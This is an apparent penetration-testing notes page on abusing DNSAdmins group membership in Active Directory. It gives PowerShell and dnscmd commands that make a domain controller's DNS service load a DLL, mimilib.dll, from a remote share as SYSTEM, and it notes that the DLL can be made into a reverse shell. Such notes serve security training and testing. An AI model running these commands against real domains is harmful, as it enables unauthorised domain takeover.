# DNSAdmins

It is possible for the members of the DNSAdmins group to load arbitrary DLL with the privileges of dns.exe (SYSTEM).  In the case the DC also serves as DNS, this will provide us escalation to DA.

Need privileges to restart the DNS service.

## Get Group Membership

With PowerView

```powershell
Get-NetGroupMember -GroupName DNSAdmins
```

Using Active Directory Module

```powershell
Get-ADGroupMember -Identity DNSAdmins
```

## Privilege Escalation

You will need to have compromised an account that is a member of at least DNS Admins or Administator on the DNS Server.  

You need to have the RSAT available to execute the following steps

[Remote Server Administration Tools - Windows Server](https://docs.microsoft.com/en-us/troubleshoot/windows-server/system-management-components/remote-server-administration-tools)

Check that the account has permission to stop / start the DNS service

```powershell
PS C:\Windows\system32> sc.exe \\dcorp-dc query dns

SERVICE_NAME: dns
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 4  RUNNING
                                (STOPPABLE, PAUSABLE, ACCEPTS_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0
```

From the privileges of DNSAdmins group member, configure DLL using `dnscmd.exe` (needs RSAT DNS):

```powershell
dnscmd dcorp-dc /config /serverlevelplugindll \\172.16.50.100\dll\mimilib.dll
```

Using DNSServer module (needs RSAT DNS):

```powershell
$dnsettings = Get-DnsServerSetting -ComputerName dcorp-dc Verbose -All
$dnsettings.ServerLevelPluginDll = "\\172.16.50.100\dll\mimilib.dll"
Set-DnsServerSetting -InputObject $dnsettings -ComputerName dcorp-dc -Verbose
```

Restart the DNS Service and by default, the `mimlib.dll` logs all DNS queries to `c:\windows\system32\kiwidns.log`

### Modifying the DLL

It is possible to modify the DLL to make into a reverse shell, but do note that this would be a synchronous connection and DNS queries would fail and it would be better to have it change permissions or carry out some other task.

![DNSAdmin Privilege Escalation](../../Assets/Images/DNSAdmin_dll.png)